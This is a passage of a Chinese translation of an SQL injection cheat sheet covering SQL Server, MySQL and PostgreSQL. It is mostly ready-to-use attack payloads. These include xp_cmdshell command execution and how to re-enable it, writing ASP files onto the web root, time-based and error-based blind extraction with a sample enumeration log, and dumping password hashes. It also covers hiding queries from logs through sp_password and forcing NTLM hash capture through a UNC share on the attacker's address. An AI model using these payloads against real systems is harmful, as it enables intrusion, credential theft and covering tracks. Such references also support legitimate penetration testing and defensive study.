6)(%systemroot%\\system32\\inetsrv\\MetaBase.xml)然后在里面找到应用目录。 新建一个表foo(line varchar(8000)) BULK INSERT foo FROM &#39;c:\\inetpub\\wwwroot\\login.asp&#39; DROP了临时表，重复另一个文件 BCP(S)写入文件。这个功能需要登录bcp &quot;SELECT * FROM test..foo&quot; queryout c:\\inetpub\\wwwroot\\runcommand.asp -c -Slocalhost -Usa -Pfoobar SQL Server的VBS/WSH(S)由于ActiveX的支持，你能在SQL Server中使用VBS/WSH declare @o int exec sp_oacreate &apos;wscript.shell&apos;, @o out exec sp_oamethod @o, &apos;run&apos;, NULL, &apos;notepad.exe&apos; Username: &#39;; declare @o int exec sp_oacreate &#39;wscript.shell&#39;, @o out exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39; -- 执行系统命令，xp_cmdshell(S)众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限 EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39; 用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。 EXEC master.dbo.xp_cmdshell &#39;ping &#39; 如果有错误，或者union或者其他的什么，你都不能直接读到结果。 SQL Server中的一些特殊的表(S) Error Messages master..sysmessages Linked Servers master..sysservers Password (2000和2005版本的都能被破解，这俩的加密算法很相似) SQL Server 2000: masters..sysxlogins SQL Server 2005 : sys.sql_logins SQL Server的其它内置程序(S) 命令执行 (xp_cmdshell) exec master..xp_cmdshell &#39;dir&#39; 注册表操作 (xp_regread) xp_regaddmultistring xp_regdeletekey xp_regdeletevalue xp_regenumkeys xp_regenumvalues xp_regread xp_regremovemultistring xp_regwrite exec xp_regread HKEY_LOCAL_MACHINE, &apos;SYSTEM\\CurrentControlSet \\Services\\lanmanserver\\parameters&apos;, &apos;nullsessionshares&apos; exec xp_regenumvalues HKEY_LOCAL_MACHINE, &apos;SYSTEM \\CurrentControlSet \\Services\\snmp\\parameters\\validcommunities&apos; 管理服务(xp_servicecontrol) 媒体(xp_availablemedia) ODBC 资源 (xp_enumdsn) 登录 (xp_loginconfig) 创建Cab文件 (xp_makecab) 域名列举 (xp_ntsec_enumdomains) 杀进程 (need PID) (xp_terminate_process) 新建进程 (实际上你想干嘛都行) sp_addextendedproc ‘xp_webserver’, ‘c:\\temp\\x.dll’ exec xp_webserver 写文件进UNC或者内部路径 (sp_makewebtask) 大量MSSQL笔记SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/ DECLARE @result int; EXEC @result = xp_cmdshell &#39;dir *.exe&#39;;IF (@result = 0) SELECT 0 ELSE SELECT 1/0 HOST_NAME()IS_MEMBER (Transact-SQL)IS_SRVROLEMEMBER (Transact-SQL)OPENDATASOURCE (Transact-SQL) INSERT tbl EXEC master..xp_cmdshell OSQL /Q&quot;DBCC SHOWCONTIG&quot; OPENROWSET (Transact-SQL) - http://msdn2.microsoft.com/en-us/library/ms190312.aspx 你不能在 SQL Server 的Insert查询里使用子查询(sub select). 使用LIMIT(M)或ORDER(MSO)的注入SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,&#39;x&#39;/*,10 ; 如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。 关掉SQL Server(S)如果你真的急了眼，&#39;;shutdown -- 在SQL Server 2005中启用xp_cmdshell默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。 EXEC sp_configure &apos;show advanced options&apos;,1 RECONFIGURE EXEC sp_configure &apos;xp_cmdshell&apos;,1 RECONFIGURE 探测SQL Server数据库的结构(S)获取用户定义表SELECT name FROM sysobjects WHERE xtype = &#39;U&#39; 获取字段名SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;tablenameforcolumnnames&#39;) 移动记录(Moving records)(S) 修改WHERE，使用NOT IN或者NOT EXIST ... WHERE users NOT IN (&#39;First User&#39;, &#39;Second User&#39;) SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) – 这个好用 脏的不行的小技巧 SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=&#39;U&#39; and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = &#39;U&#39;) as p where p.x=21 快速的脱掉基于错误(Error Based)的SQL Server注入(S)&#39;;BEGIN DECLARE @rt varchar(8000) SET @rd=&#39;:&#39; SELECT @rd=@rd+&#39; &#39;+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;MEMBERS&#39;) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;-- 详情请参考：Fast way to extract data from Error Based SQL Injections 盲注关于盲注一个经过完整而优秀开发的应用一般来说你是看不到错误提示的，所以你是没办法从Union攻击和错误中提取出数据的 一般盲注，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果 完全盲注，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。 在一般盲注下你能够使用If语句或者WHERE查询注入*(一般来说比较简单)*，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用WAIT FOR DELAY ‘0:0:10’，在MySQL中使用BENCHMARK()，在PostgreSQL中使用pg_sleep(10)，以及在ORACLE中的一些PL/SQL小技巧。 实战中的盲注实例以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。 TRUE和FALSE标志代表了查询返回了true或false TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 由于上面后两个查询都是false，我们能清楚的知道表名的第一个字符的ASCII码是80，也就是”P”。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。 延时盲注首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。 WAITFOR DELAY [time](S)这就跟sleep差不多，等待特定的时间。通过CPU来让数据库进行等待。 WAITFOR DELAY &#39;0:0:10&#39;-- 你也可以这样用 WAITFOR DELAY &#39;0:0:0.51&#39; 实例 俺是sa吗？ if (select user) = &#39;sa&#39; waitfor delay &#39;0:0:10&#39; ProductID =1;waitfor delay &#39;0:0:10&#39;-- ProductID =1);waitfor delay &#39;0:0:10&#39;-- ProductID =1&#39;;waitfor delay &#39;0:0:10&#39;-- ProductID =1&#39;);waitfor delay &#39;0:0:10&#39;-- ProductID =1));waitfor delay &#39;0:0:10&#39;-- ProductID =1&#39;));waitfor delay &#39;0:0:10&#39;-- BENCHMARK()(M)一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。BENCHMARK(howmanytimes, do this) 实例 俺是root吗？爽！ IF EXISTS (SELECT * FROM users WHERE username = &#39;root&#39;) BENCHMARK(1000000000,MD5(1)) 判断表是否存在 IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1)) pg_sleep(seconds)(P)睡眠指定秒数。 SELECT pg_sleep(10);睡个十秒 掩盖痕迹-sp_password log bypass(S)出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。 注入测试这些测试既简单又清晰，适用于盲注和悄悄地搞。 product.asp?id=4 (SMO) product.asp?id=5-1 product.asp?id=4 OR 1=1 product.asp?name=Book product.asp?name=Bo’%2b’ok product.asp?name=Bo’ || ’ok (OM) product.asp?name=Book’ OR ‘x’=’x 一些其他的MySQL笔记 子查询只能在MySQL4.1+使用 用户 SELECT User,Password FROM mysql.user; SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=&#39;2&#39;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’; SELECT ... INTO DUMPFILE 把查询写入一个新文件中(不能修改已有文件) UDF功能 create function LockWorkStation returns integer soname &#39;user32&#39;; select LockWorkStation(); create function ExitProcess returns integer soname &#39;kernel32&#39;; select exitprocess(); SELECT USER(); SELECT password,USER() FROM mysql.user; admin密码哈希的第一位 SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1; 文件读取 query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 MySQL读取文件内容 默认这个功能是没开启的！ create table foo( line blob ); load data infile &apos;c:/boot.ini&apos; into table foo; select * from foo; MySQL里的各种延时 select benchmark( 500000, sha1( &#39;test&#39; ) ); query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 select if( user() like &#39;root@%&#39;, benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; ); 遍历数据，暴力猜解 select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; ); MySQL中好用的函数 MD5() MD5哈希 SHA1() SHA1哈希 PASSWORD() ENCODE() COMPRESS() 压缩数据，在盲注时读取大量数据很好用 ROW_COUNT() SCHEMA() VERSION() 跟@@version是一样的 SQL注入的高级使用一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem） Name:&#39; + (SELECT TOP 1 password FROM users ) + &#39; Email : `xx@xx.com` 如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。 强制SQL Server来得到NTLM哈希这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。 Bulk insert UNC共享文件 (S)bulk insert foo from &#39;\\\\YOURIPADDRESS\\C$\\x.txt&#39; 参考资料因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请给我发邮件(ferruh-at-mavituna.com)，我会尽快更新。 各种资料 Advanced SQL Injection In SQL Applications, Chris Anley More Advanced SQL Injection In SQL Applications, Chris Anley Blindfolded SQL Injection, Ofer Maor – Amichai Shulman Hackproofing MySQL, Chris Anley Database Hacker’s Handbook, David Litchfield, Chris Anley, John Heasman, Bill Grindlay 楼上的团队！ MSSQL相关 MSSQL Operators - http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx Transact-SQL Reference - http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx String Functions (Transact-SQL) - http://msdn2.microsoft.com/en-us/library/ms181984.aspx List of MSSQL Server Collation Names - http://msdn2.microsoft.com/en-us/library/ms180175.aspx MSSQL Server 2005 Login Information and some other functions : Sumit Siddharth MySQL相关 Comments : http://dev.mysql.com/doc/ Control Flows - http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html MySQL Gotchas - http://sql-info.de/mysql/gotchas.htm New SQL Injection Concept, Tonu Samuel 更新日志 15/03/2007 - Public Release v1.0 16/03/2007 - v1.1 Links added for some paper and book references Collation sample added Some typos fixed Styles and Formatting improved New MySQL version and comment samples PostgreSQL Added to Ascii and legends, pg_sleep() added blind section Blind SQL Injection section and improvements, new samples Reference paper added for MySQL comments 21/03/2007 - v1.2 BENCHMARK() sample changed to avoid people DoS their MySQL Servers More Formatting and Typo Descriptions for some MySQL Function 30/03/2007 v1.3 Niko pointed out PotsgreSQL and PHP supports stacked queries Bypassing second MD5 check login screens description and attack added Mark came with extracting NTLM session idea, added Detailed Blind SQL Exploitation added 13/04/2007 v1.4 - Release SQL Server 2005 enabling xp_cmdshell added (trick learned from mark) 日文版SQL注入速查表发布 (v1.1)","tags":[{"name":"数据库","slug":"数据库","permalink":"http://www.zi0n.cn/tags/数据库/"},{"name":"web","slug":"web","permalink":"http://www.zi0n.cn/tags/web/"},{"name":"注入","slug":"注入","permalink":"http://www.zi0n.cn/tags/注入/"}]}]